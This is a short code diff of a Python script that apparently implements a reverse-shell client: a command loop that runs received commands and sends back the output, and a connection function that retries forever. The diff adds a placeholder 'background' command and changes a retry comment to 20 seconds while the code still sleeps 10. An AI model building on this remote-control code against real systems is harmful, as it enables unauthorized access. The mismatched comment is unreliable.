@@ -103,6 +103,9 @@ def shell():
         if command == 'exit': # Exit the loop if the exit message is received 
             break
 
+        elif command == 'background':
+            pass
+
         elif command == 'help':
             pass
 
@@ -155,7 +158,7 @@ def shell():
             result = result.decode('latin-1')
             send(result)
 
-# Retry connection every 10 seconds forever until the connection is astablished
+# Retry connection every 20 seconds forever until the connection is astablished
 def connection():
     while True:
         time.sleep(10)
